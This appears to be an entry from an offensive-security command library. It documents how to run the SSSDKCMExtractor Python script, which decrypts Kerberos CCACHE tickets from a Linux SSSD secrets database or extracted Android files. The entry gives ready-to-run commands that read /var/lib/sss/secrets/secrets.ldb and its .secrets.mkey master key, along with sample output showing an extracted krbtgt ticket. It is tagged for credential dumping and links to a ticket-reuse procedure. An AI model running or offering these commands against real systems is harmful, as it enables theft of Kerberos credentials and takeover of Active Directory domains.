---
id: 9b64655a-12f4-419f-ad17-e4b7137ef398
name: python-extract-secrets-sssdkcmextractor
type: command
executor: bash
data: python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
output: null
created_at: '2023-04-06T03:56:08.604338+00:00'
updated_at: '2023-10-10T20:26:03.243838+00:00'
platforms:
  - Linux
tags:
  - extraction
  - kerberos
  - credential-dumping
verified: true
validated: true
---

# python-extract-secrets-sssdkcmextractor

## Command

```bash
python3 SSSDKCMExtractor.py --database $_DATABASE_PATH --key $_KEY_PATH
```

## Description

This command runs the SSSDKCMExtractor Python script to decrypt and extract Kerberos CCACHE tickets from an SSSD secrets database using the provided master key. It supports both Linux SSSD files and extracted Android SSD files for credential dumping in AD environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--database $_DATABASE_PATH` | Path to the SSSD secrets database file (e.g., /var/lib/sss/secrets/secrets.ldb or android.ssd) | Yes |
| `--key $_KEY_PATH` | Path to the master key file (e.g., /var/lib/sss/secrets/.secrets.mkey) | Yes |

## Examples

### Basic Usage on Linux

```bash
python3 SSSDKCMExtractor.py --database /var/lib/sss/secrets/secrets.ldb --key /var/lib/sss/secrets/.secrets.mkey
```

### Usage with Android Files

```bash
python3 SSSDKCMExtractor.py --database extracted_android.ssd --key android_key.mkey
```

## Expected Output

Extracting secrets from secrets.ldb using key .secrets.mkey...
Decrypted CCACHE ticket: krbtgt/DOMAIN@REALM.ccache
Ticket extracted successfully to output directory.

## Related

- [[procedures/CCACHE-Ticket-Reuse-from-SSSD-KCM-and-Android-Devices]]
- [[commands/git-clone-sssdkcmextractor-repository]]
